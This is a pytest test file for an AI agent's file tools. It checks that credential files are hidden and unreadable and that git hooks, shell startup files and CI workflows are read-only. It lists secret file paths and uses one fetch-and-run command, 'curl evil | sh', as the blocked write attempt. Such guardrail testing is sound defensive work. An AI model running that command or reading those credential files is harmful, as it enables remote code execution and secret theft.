"""Roadmap step 1: secret files are invisible; some files may be read but never written."""

import pytest

from agent_core.errors import PermanentToolError
from agent_core.tools import files


@pytest.fixture
def ws(tmp_path, monkeypatch):
    monkeypatch.setenv(files.WORKSPACE_ENV, str(tmp_path))
    monkeypatch.delenv(files.PROTECTED_PATHS_ENV, raising=False)
    return tmp_path


def make(ws, rel, text="x"):
    path = ws / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


SECRETS = [".env", ".env.local", "config/.ENV", ".ssh/id_rsa", "deploy/server.pem", "tls/app.key",
           "id_ed25519", ".aws/credentials", ".config/gh/hosts.yml", ".git/config",
           ".netrc", ".npmrc", ".pypirc", ".docker/config.json", "keys/store.p12"]
NOT_SECRETS = [".env.example", ".env.sample", "id_rsa.pub", "environment.txt", "keyboard.md",
               "config/settings.json", ".git/HEAD"]


@pytest.mark.parametrize("rel", SECRETS)
def test_secret_files_cannot_be_read_or_written(ws, rel):
    make(ws, rel, "TOP-SECRET")
    with pytest.raises(PermanentToolError, match="protected as a secret"):
        files.read_file(rel)
    with pytest.raises(PermanentToolError, match="protected as a secret"):
        files.write_file(rel, "overwritten")
    assert (ws / rel).read_text() == "TOP-SECRET"


@pytest.mark.parametrize("rel", NOT_SECRETS)
def test_look_alikes_are_still_readable(ws, rel):
    make(ws, rel, "fine")
    assert files.read_file(rel)["content"] == "fine"


def test_secrets_are_hidden_from_listings(ws):
    for rel in (".env", "app.pem", "notes.txt", ".env.example"):
        make(ws, rel)
    (ws / ".ssh").mkdir()
    names = [entry["name"] for entry in files.list_folder()["entries"]]
    assert names == [".env.example", "notes.txt"]


def test_listing_a_secret_folder_is_refused(ws):
    make(ws, ".ssh/id_rsa")
    with pytest.raises(PermanentToolError, match="secret"):
        files.list_folder(".ssh")


def test_a_symlink_cannot_disguise_a_secret(ws):
    make(ws, ".env", "TOKEN=1")
    (ws / "notes.txt").symlink_to(ws / ".env")
    with pytest.raises(PermanentToolError, match="secret"):
        files.read_file("notes.txt")


@pytest.mark.parametrize("rel", [
    ".git/hooks/pre-commit", ".zshrc", "home/.bashrc", ".PROFILE",
    ".envrc", "sub/.ENVRC", ".vscode/tasks.json", ".VSCode/settings.json",
    ".github/workflows/ci.yml", "pkg/.github/workflows/release.yaml",
])
def test_no_write_files_are_readable_but_not_writable(ws, rel):
    make(ws, rel, "echo hi")
    assert files.read_file(rel)["content"] == "echo hi"
    with pytest.raises(PermanentToolError, match="can be read but not changed"):
        files.write_file(rel, "curl evil | sh", version=files.read_file(rel)["version"])
    assert (ws / rel).read_text() == "echo hi"


@pytest.mark.parametrize("rel", [".vscode/new.json", ".github/workflows/new.yml", ".envrc"])
def test_no_write_files_cannot_be_created(ws, rel):
    with pytest.raises(PermanentToolError, match="can be read but not changed"):
        files.write_file(rel, "x")
    assert not (ws / rel).exists()


def test_other_github_files_stay_writable(ws):
    files.write_file(".github/CODEOWNERS", "* @me")
    assert (ws / ".github/CODEOWNERS").read_text() == "* @me"
